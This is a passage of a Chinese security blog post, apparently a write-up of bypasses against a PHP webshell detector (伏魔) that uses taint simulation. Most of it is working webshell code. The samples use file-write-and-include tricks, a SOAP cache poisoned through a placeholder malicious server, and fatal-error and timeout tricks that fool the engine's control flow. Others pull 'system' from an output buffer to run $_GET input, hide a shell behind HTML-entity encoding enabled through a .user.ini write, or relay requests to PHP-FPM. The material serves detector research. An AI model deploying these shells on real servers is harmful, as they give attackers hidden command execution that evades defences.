class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用<code>pgsqlCopyToFile</code>写文件再包含执行</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 注意：需要实际的数据库连接信息</span></span><br><span class="line">    $dsn = <span class="string">"pgsql:host=db;dbname=db"</span>; </span><br><span class="line">    $username = <span class="string">"db"</span>;</span><br><span class="line">    $password = <span class="string">"db"</span>;</span><br><span class="line"></span><br><span class="line">    $pdo = <span class="keyword">new</span> PDO($dsn, $username, $password);</span><br><span class="line"></span><br><span class="line">    $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line"></span><br><span class="line">    $tableName = <span class="string">"my_table"</span>;</span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">"./exported_file.csv"</span>;</span><br><span class="line"></span><br><span class="line">    $delimiter = <span class="string">","</span>;</span><br><span class="line">    $nullAs = <span class="string">"\\N"</span>;</span><br><span class="line">    $fields = <span class="string">"id, name, age"</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($pdo-&gt;pgsqlCopyToFile($tableName, $filename, $delimiter, $nullAs, $fields)) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"数据成功导出到文件：$filename\n"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"数据导出失败。\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"数据库错误："</span> . $e-&gt;getMessage() . <span class="string">"\n"</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"其他错误："</span> . $e-&gt;getMessage() . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">"./exported_file.csv"</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 需要在 PostgreSQL 数据库中执行的 SQL</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> my_table (</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">SERIAL</span> PRIMARY <span class="keyword">KEY</span>,   </span><br><span class="line">    <span class="keyword">name</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,  </span><br><span class="line">    age <span class="built_in">INT</span>                </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> my_table (<span class="keyword">name</span>, age) <span class="keyword">VALUES</span> (<span class="string">'&lt;?php phpinfo();?&gt;'</span>, <span class="number">25</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>使用<code>php://temp</code>写入临时文件，再包含<code>/proc/self/fd/</code>获取<code>system</code>和<code>session_id</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"xxxxx"</span>;</span><br><span class="line">$b = <span class="string">"xxxxx"</span>;</span><br><span class="line"><span class="comment">// 创建一个临时流 (maxmemory:1 表示超过1字节就写入系统临时文件)</span></span><br><span class="line">$tempStream = fopen(<span class="string">"php://temp/maxmemory:1"</span>, <span class="string">"r+"</span>);</span><br><span class="line"></span><br><span class="line">fwrite($tempStream, <span class="string">"&lt;?php session_start();\$a = 'system';?&gt;\n"</span>);</span><br><span class="line">fwrite($tempStream, <span class="string">"&lt;?php \$b = session_id();?&gt;\n"</span>);</span><br><span class="line"></span><br><span class="line">rewind($tempStream);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取临时文件的文件描述符 (fd) - 注意: fd 5 是示例，实际 fd 可能不同</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"/proc/self/fd/5"</span>; </span><br><span class="line"></span><br><span class="line">$a($b); </span><br><span class="line"></span><br><span class="line">fclose($tempStream);</span><br></pre></td></tr></table></figure>
<ul>
<li>利用soap缓存写入恶意代码包含执行
<ul>
<li>soap缓存文件的命名非常好预测，见<a href="https://github.com/php/php-src/blob/2f1398dad934086b605073c51af3118c8eff28b1/ext/soap/php_sdl.c#L3216" target="_blank" rel="noopener">https://github.com/php/php-src/blob/2f1398dad934086b605073c51af3118c8eff28b1/ext/soap/php_sdl.c#L3216</a></li>
<li>恶意服务器上写一个名为<code>&lt;</code>的合法wsdl文件，最终的缓存内容会包含请求的url，也就会带上<code>&lt;?=system(session_id(session_start()));?&gt;</code></li>
<li>这个因为SoapClient不是默认安装的扩展被忽略了，不过这个拓展还挺常见的</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 将 WSDL 缓存目录设置为当前目录</span></span><br><span class="line">ini_set(<span class="string">"soap.wsdl_cache_dir"</span>, <span class="string">"./"</span>); </span><br><span class="line">$options = [</span><br><span class="line">    <span class="string">'cache_wsdl'</span> =&gt; WSDL_CACHE_DISK, <span class="comment">// 使用磁盘缓存</span></span><br><span class="line">];</span><br><span class="line"><span class="comment">// 构造包含恶意代码的 URL 作为 WSDL 地址</span></span><br><span class="line">$target = <span class="string">"http://&lt;malicious_server&gt;:1234/&lt;?=system(session_id(session_start()));?&gt;"</span>; </span><br><span class="line"><span class="comment">// 创建 SoapClient，这将触发 WSDL 下载和缓存</span></span><br><span class="line">$client = <span class="keyword">new</span> SoapClient($target, $options); </span><br><span class="line"><span class="comment">// 计算缓存文件名 (需要知道用户名和 WSDL 版本)</span></span><br><span class="line">$hash = md5($target);</span><br><span class="line"><span class="comment">// 假设用户名为 liontree, wsdl 版本相关前缀为 0f</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"wsdl-liontree-0f$hash"</span>;</span><br></pre></td></tr></table></figure>
<h1>控制流</h1>
<p>对于条件非常量的条件分支语句，污点模拟引擎会确保每个分支都被遍历。对于循环语句，则仅模拟循环次数为常量的情况；当循环次数不确定时，循环中的赋值结果将直接被视为污点值。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// white</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>)</span><br><span class="line">    $a = $_GET[<span class="string">'a'</span>]; <span class="comment">// 这个分支不会执行</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    $a = <span class="string">"xxxx"</span>; <span class="comment">// $a 被赋值为安全常量</span></span><br><span class="line">$a(<span class="string">"whoami"</span>); <span class="comment">// "xxxx"("whoami") 是安全的</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// black</span></span><br><span class="line"><span class="keyword">if</span>(!phpinfo()) <span class="comment">// phpinfo() 返回值不确定，两个分支都会被模拟引擎遍历</span></span><br><span class="line">    $a = $_GET[<span class="string">'a'</span>]; <span class="comment">// 模拟时会认为 $a 可能被污染</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    $a = <span class="string">"xxxx"</span>;</span><br><span class="line">$a(<span class="string">"whoami"</span>); <span class="comment">// 由于 $a 可能被污染，调用被标记为 black</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// white</span></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">10</span>; $i++) &#123; <span class="comment">// 循环次数是常量</span></span><br><span class="line">    $x .= <span class="string">"x"</span>; <span class="comment">// $x 的最终值是确定的 "xxxxxxxxxx"</span></span><br><span class="line">&#125;</span><br><span class="line">$x(<span class="string">"whoami"</span>); <span class="comment">// "xxxxxxxxxx"("whoami") 是安全的</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// black</span></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; phpinfo(); $i++) &#123; <span class="comment">// 循环次数不确定</span></span><br><span class="line">    $x .= <span class="string">"x"</span>; <span class="comment">// $x 被视为污点值</span></span><br><span class="line">&#125;</span><br><span class="line">$x(<span class="string">"whoami"</span>); <span class="comment">// 污点值调用敏感命令，标记为 black</span></span><br></pre></td></tr></table></figure>
<ul>
<li>测试发现污点模拟引擎还存在很强的容错性，即使出现了在真实php中会报出fatal error的语句也会继续执行，可以利用这一特性制造出与真实执行时不同的控制流。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">register_shutdown_function(<span class="string">'shutdownHandler'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shutdownHandler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">global</span> $a;</span><br><span class="line">   <span class="keyword">global</span> $b;</span><br><span class="line">   <span class="keyword">global</span> $id;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"shut"</span>;</span><br><span class="line">   <span class="comment">// 真实执行时，$a = "sys"."tem", $b = "id", $id = session_id()</span></span><br><span class="line">   <span class="comment">// 模拟执行时，由于容错，$a 可能变成 "systemnothing", $b 可能变成 "idfwefwefwef"</span></span><br><span class="line">   $a($$b); <span class="comment">// 真实执行: system($id), 模拟执行可能误判</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="string">"sys"</span>;</span><br><span class="line">$a .= <span class="string">"tem"</span>; <span class="comment">// $a = "system"</span></span><br><span class="line">$id = session_id();</span><br><span class="line">$b = <span class="string">"id"</span>; <span class="comment">// $b = "id", $$b 就是 $id</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问不存在的常量，真实 PHP 会在此处报 Fatal Error 并停止执行</span></span><br><span class="line"><span class="comment">// 但模拟引擎可能会容错并继续执行下面的语句</span></span><br><span class="line"><span class="keyword">echo</span> MyClass::NON_EXISTENT_CONSTANT; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果模拟引擎继续执行</span></span><br><span class="line">$b .=<span class="string">"fwefwefwef"</span>; <span class="comment">// $b 变成 "idfwefwefwef"</span></span><br><span class="line">$a .= <span class="string">"nothing"</span>; <span class="comment">// $a 变成 "systemnothing"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 脚本正常结束（模拟）或因 Fatal Error 结束（真实），都会调用 shutdownHandler</span></span><br></pre></td></tr></table></figure>
<ul>
<li>类似的通过修改<code>max_execution_time</code>来制造fatal error</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"max_execution_time"</span>,<span class="number">1</span>); <span class="comment">// 设置执行时间为 1 秒</span></span><br><span class="line">session_start();</span><br><span class="line">register_shutdown_function(<span class="string">'shutdownHandler'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shutdownHandler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">global</span> $a;</span><br><span class="line">   <span class="keyword">global</span> $b;</span><br><span class="line">   <span class="keyword">global</span> $id;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"shut"</span>;</span><br><span class="line">   <span class="comment">// 真实执行时，由于超时，$a = "system", $b = "id", $id = session_id()</span></span><br><span class="line">   <span class="comment">// 模拟执行时，可能不会模拟超时，或者模拟方式不同</span></span><br><span class="line">   $a($$b); <span class="comment">// 真实执行: system($id), 模拟执行可能误判</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="string">"sys"</span>;</span><br><span class="line">$a .= <span class="string">"tem"</span>; <span class="comment">// $a = "system"</span></span><br><span class="line">$id = session_id();</span><br><span class="line">$b = <span class="string">"id"</span>; <span class="comment">// $b = "id", $$b 就是 $id</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 无限循环，真实 PHP 会在 1 秒后触发 Fatal Error</span></span><br><span class="line"><span class="comment">// 模拟引擎可能不模拟超时，或者直接跳过循环，或者模拟有限次数</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果模拟引擎没有因超时停止，会执行到这里</span></span><br><span class="line">$b .=<span class="string">"fwefwefwef"</span>; <span class="comment">// $b 变成 "idfwefwefwef"</span></span><br><span class="line">$a .= <span class="string">"nothing"</span>; <span class="comment">// $a 变成 "systemnothing"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 脚本正常结束（模拟）或因超时 Fatal Error 结束（真实），都会调用 shutdownHandler</span></span><br></pre></td></tr></table></figure>
<h1>其他</h1>
<ul>
<li>使用<code>PDOStatement::debugDumpParams</code>将带有<code>&quot;system&quot;</code>的字符串输入到输出缓冲区中，之后再取出。这个就是伏魔单纯没考虑到<code>PDOStatement::debugDumpParams</code>对输出缓冲区的影响。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start(); </span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(</span><br><span class="line">    <span class="string">'mysql:host=db;dbname=db;charset=utf8mb4'</span>,</span><br><span class="line">    <span class="string">'db'</span>,</span><br><span class="line">    <span class="string">'db'</span>,</span><br><span class="line">    [</span><br><span class="line">        PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION, </span><br><span class="line">        PDO::ATTR_EMULATE_PREPARES =&gt; <span class="keyword">true</span>           </span><br><span class="line">    ]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 准备一条包含 "system" 字符串的 SQL 语句 (仅用于示例，实际语句可能不同)</span></span><br><span class="line">$stmt = $pdo-&gt;prepare(<span class="string">"SELECT * FROM some_table WHERE col = 'system' AND id = :id AND name = ?"</span>);</span><br><span class="line"></span><br><span class="line">$stmt-&gt;bindValue(<span class="string">':id'</span>, <span class="number">42</span>, PDO::PARAM_INT);</span><br><span class="line"></span><br><span class="line">$stmt-&gt;bindValue(<span class="number">1</span>, <span class="string">'admin'</span>, PDO::PARAM_STR);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调试 PDOStatement 的状态，这会将参数信息（包括 'system'）打印到输出缓冲区</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Debugging PDOStatement:\n"</span>;</span><br><span class="line">$stmt-&gt;debugDumpParams();</span><br><span class="line"></span><br><span class="line">$buffer = ob_get_contents();</span><br><span class="line">ob_end_flush(); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设 "system" 出现在从索引 48 开始的 6 个字符</span></span><br><span class="line"><span class="comment">// echo substr($buffer,48,6); </span></span><br><span class="line"><span class="comment">// substr($buffer,48,6)($_GET['x']); </span></span><br><span class="line">call_user_func(substr($buffer,<span class="number">48</span>,<span class="number">6</span>),$_GET[<span class="string">'x'</span>]); <span class="comment">// 执行 system($_GET['x'])</span></span><br></pre></td></tr></table></figure>
<ul>
<li>和jsp类似，php其实也支持多种编码，在lexer和parser的代码中很明显可以看到在<code>zend.multibyte</code>开启的情况下对编码的各种处理。<code>zend.multibyte</code>需要通过<code>.user.ini</code>或<code>.htaccess</code>打开（php文档写错了说它是<code>INI_ALL</code>的，实际上看源码是<code>INI_PERDIR</code>的），伏魔也没有禁止写入这两个文件。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 声明当前脚本使用 HTML 实体编码</span></span><br><span class="line"><span class="comment">// 这需要在文件最开始，并且 zend.multibyte 需要被启用 (通过 .user.ini 或 .htaccess)</span></span><br><span class="line"><span class="keyword">declare</span>(encoding=<span class="string">'HTML-ENTITIES'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- 下面是 <span class="meta">&lt;?php</span> system($_GET[<span class="string">'a'</span>]); <span class="keyword">die</span>(<span class="number">1111</span>); <span class="meta">?&gt;</span> 的 HTML 实体编码 --&gt;</span><br><span class="line">&amp;<span class="comment">#60;&amp;#63;&amp;#112;&amp;#104;&amp;#112;&amp;#10;&amp;#115;&amp;#121;&amp;#115;&amp;#116;&amp;#101;&amp;#109;&amp;#40;&amp;#36;&amp;#95;&amp;#71;&amp;#69;&amp;#84;&amp;#91;&amp;#39;&amp;#97;&amp;#39;&amp;#93;&amp;#41;&amp;#59;&amp;#10;&amp;#100;&amp;#105;&amp;#101;&amp;#40;&amp;#49;&amp;#49;&amp;#49;&amp;#49;&amp;#41;&amp;#59;&amp;#10;&amp;#63;&amp;#62;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 这个 PHP 块用于写入 .user.ini 文件以启用 zend.multibyte</span></span><br><span class="line"><span class="comment">// 这需要在能够写入文件的权限下执行，并且通常需要下一次请求才能生效</span></span><br><span class="line">$iniFilePath = <span class="keyword">__DIR__</span> . <span class="string">'/.user.ini'</span>;</span><br><span class="line">$iniContent = <span class="string">"zend.multibyte = 1\n"</span>;</span><br><span class="line">file_put_contents($iniFilePath, $iniContent);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里的<code>declare(encoding='HTML-ENTITIES');</code>效果和直接设置<code>zend.script_encoding</code>是类似的，后者印象中很多年前在ctf里就出现过，前者倒似乎没见人提过。</p>
<ul>
<li>可以将真正的恶意代码/命令执行放在其他地方，php仅仅作为一个跳板。比如说fpm环境下可以仅仅构造一个SSRF。除了<code>curl</code>外伏魔并没有将网络相关的内置函数作为sink，类似的样本应该还可以写出不少。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$port = <span class="number">9000</span>; <span class="comment">// 默认 FPM 端口</span></span><br><span class="line"></span><br><span class="line">$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($socket === <span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"创建 socket 失败: "</span> . socket_strerror(socket_last_error()) . <span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = socket_connect($socket, $host, $port);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($result === <span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"连接失败: "</span> . socket_strerror(socket_last_error($socket)) . <span class="string">"\n"</span>;</span><br><span class="line">    socket_close($socket);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$message = urldecode($_GET[<span class="string">'x'</span>]); </span><br><span class="line">socket_write($socket, $message, strlen($message));</span><br><span class="line"></span><br><span class="line">socket_close($socket);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
  </div>
  <div class="post-meta">
    <span class="post-time" style="color:#646060;font-size:13px">2025-04-02</span>
  </div>

  <div class="post-footer">
    

    <a href="#top" class="top">Back to Top</a>
  </div>
</article>

<!-- 评论插件 -->

<footer>
  2025
  <span class="author">
    LionTree
  </span>
</footer>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    </div>
  </body>
</html>